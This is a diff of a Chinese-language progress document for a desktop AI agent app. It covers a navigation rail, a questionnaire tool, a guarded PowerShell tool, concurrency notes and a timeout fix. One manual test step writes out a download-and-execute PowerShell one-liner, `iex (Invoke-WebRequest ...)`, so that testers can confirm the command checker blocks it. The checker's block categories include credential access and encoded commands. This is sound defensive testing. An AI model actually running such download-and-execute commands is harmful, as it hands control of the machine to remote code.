@@ -1,6 +1,6 @@
 # 当前进度
 
-> 最后更新：2026-09-09（多任务并发：会话注册表 + 后台保活 + 任务状态可见，spec：.trae/specs/support-concurrent-tasks/；同日早前：定时任务自动化、plan 模式、文档读取）
+> 最后更新：2026-09-09（定时任务自动化核心闭环，spec：.trae/specs/add-automation-scheduler/；同日早前：plan 模式、Composer 统一 + 渲染层去重、文档读取）
 > 新接手请按顺序读：本文（现状 / 怎么跑 / 已知坑）→ [ROADMAP.md](ROADMAP.md)（要做什么）
 > → [ARCHITECTURE.md](ARCHITECTURE.md)（决策记录）→ [../AGENTS.md](../AGENTS.md)（开发约定）
 
@@ -172,6 +172,13 @@ smoke:sdk        本轮未重跑（无 pi SDK 边界改动，上次 3/3）
     的任务，等到期后应自动跑出会话（侧栏出现、带未读点、toast 提示），管理页展开
     运行记录可点开该会话；对话里说「每 2 分钟检查一次 XX」（craft 模式）模型应能
     建任务（权限询问一次，可点记住）；暂停后不再触发；删除运行中任务被拒。
+14. **消息刻度轨（新，见下方专节）** —— 发几轮对话后，会话流最左缘出现一排小横条
+    （每条你发的消息一个）；点击某条平滑跳到对应消息；滚动时当前位置的刻度变绿高亮。
+15. **问卷 + PowerShell（新，见下方专节）** —— ① 让它「帮我改简历，动手前问我关键问题」：
+    应弹问卷卡（选项单选 + 其他…输入 + 跳过），答完模型接着干，侧栏当前会话亮
+    「待确认」；② craft 模式让它「用 powershell 看一下当前目录有哪些文件」：先弹
+    高风险询问（可记住），然后出结果；③ 让它跑 `iex (Invoke-WebRequest "http://x").Content`
+    应被检查器直接拦截并说明原因（不执行）。
 
 发现问题直接告诉我现象即可。
 
@@ -537,6 +544,41 @@ spec：`.trae/specs/add-automation-scheduler/`。机制对齐 WorkBuddy 桌面�
 明确不做：AI 自主调下轮、jitter、月度/复杂规则、任务级独立模型/技能/权限档、
 托盘通知、并发多 run。
 
+## 消息导航刻度轨（2026-09-10）
+
+spec：`.trae/specs/add-turn-nav-rail/`（Codex 风，纯 renderer 增量）。
+会话流左缘竖向刻度轨（`turn-rail.tsx`）：每条 user 消息一个小横条，
+纵向位置 = 消息在滚动内容中的比例；点击平滑跳转；视口顶最近的用户消息
+刻度高亮跟随滚动（rAF 节流）；少于 2 条用户消息不渲染。
+两个实现要点：① 测量用 getBoundingClientRect 差值 + scrollTop，
+不用 offsetTop（.entry 自带 position:relative，offsetParent 基准会被静默换掉）；
+② 挂点在 `.stream-wrap` 而非 `.stream`——滚动容器内的 absolute 子元素会随内容
+滚走，且 stream 挂载动画的 transform 期间会让它变成后代包含块。
+纯函数 computeTicks/nearestActiveTick 11 用例。
+
+## 问卷工具 + PowerShell 工具（2026-09-10）
+
+spec：`.trae/specs/add-questionnaire-and-powershell/`（WorkBuddy 改简历场景的两个核心缺口）。
+
+1. **questionnaire 工具**：模型动手前就关键选择发起结构化问卷（1-4 问、每问 2-6 选项）。
+   全链路复用权限审批骨架：工具阻塞 → `PUSH.questionnaireRequest` → 阻塞弹层
+   （选项单选 + 固定「其他…」自由输入 + 整卡跳过 + IME 守卫）→ IPC 回传。
+   与审批共用队列语义（pi 并行工具可同时来多条），两个阻塞弹层并存时**审批优先**。
+   跳过文案明确要求模型「按现有信息继续、不追问」。三模式白名单都加（plan 尤其需要）；
+   权限门 READ_ONLY 放行；run 会话 unattended 变体直接返回不可用。
+   **侧栏「待确认」badge**：核查发现此前并不存在审批 badge 驱动（审批只走 PUSH 通道），
+   现由 App 层合成 `approvals + questionnaires > 0`，当前会话行亮 amber chip。
+2. **powershell 工具 + command-guard**：AGENTS.md §2 既定决策落地
+   （启用前置 = 危险命令检查器）。检查器纯函数五类拦截（54 用例）：
+   凭据访问（清单**派生**自 permission-policy 的 defaultProtectedDirs，同源不另写）/
+   下载执行 / 动态执行（iex/Add-Type/-EncodedCommand 族，-ec 是无歧义缩写不是字面前缀——
+   首版漏掉的坑）/ 递归强删（强制参数要求两位以上前缀，避开 -Filter 撞车）/ 系统破坏。
+   注释写明边界：**护栏不是围墙，真正的防线是权限门高风险询问档**。
+   工具：spawn `-NoProfile -NonInteractive`、24k 截断（沿用同口径）、
+   默认 120s 上限 600s、超时 kill、非 Windows 响亮报错。
+   权限门三档（read-only 拒 / balanced 高风险询问 / full 放行）；
+   **run 会话 unattended 一律拒**——后台跑 shell 等于无人审批的执行权。
+
 ## 文档读取 read_document（2026-09-09 落地）
 
 模型此前读不了 PDF/Office（pi 的 read 只支持文本+图片，PDF 读出乱码）。
@@ -600,6 +642,9 @@ Python / Git for Windows，决策记录见 ARCHITECTURE.md §4.4。
 
 ## 多任务并发（2026-09-09 落地）
 
+> 注：本节曾被并行会话的陈旧覆盖误删，2026-09-10 补回。改动以代码为准
+> （`daemon/session-registry.ts` 等均在仓，854 个测试全绿）。
+
 此前同一时间只能跑一个任务（切换时 streaming 直接拒绝）。两路调研证实：
 pi 对多 AgentSession 并发无实质障碍（automation-runner 早就在跑双宿主）；
 WorkBuddy 模型 = 运行不设硬上限、空闲 LRU 回收、切走照跑、完成通知。
@@ -627,6 +672,15 @@ WorkBuddy 模型 = 运行不设硬上限、空闲 LRU 回收、切走照跑、�
 
 784 个测试全绿（注册表/互斥/回收 13 例 + 侧栏状态 7 例新增），
 smoke:session 14/14、smoke:permission 10/10；automation-runner 零改动回归无恙。
+
+**超时错误卡误报修复（2026-09-10，另一台电脑实测）**：启动后首发「你好」先弹
+`Request timed out.` 错误卡、几秒后回复照常到达（错误卡与正常回复并存）。
+根因：pi 有自动重试（`agent_end` 带 `willRetry` 标记 + `auto_retry_start/end` 事件，
+agent-session.ts:166-167/637），失败尝试的 `message_end` 先到、终态后到；
+session-host 原先在 message_end 看到 `errorMessage` 就发 run_error。
+修复：失败只记账（`pendingRunError`），agent_end（willRetry=false）确认
+重试耗尽/未开重试才发卡；成功的助手消息清账；取消优先于错误记账。
+5 个回归测试钉住（先败后成/重试耗尽/重试后仍失败/取消优先）。854 个测试全绿。
 
 ## 已知坑
 
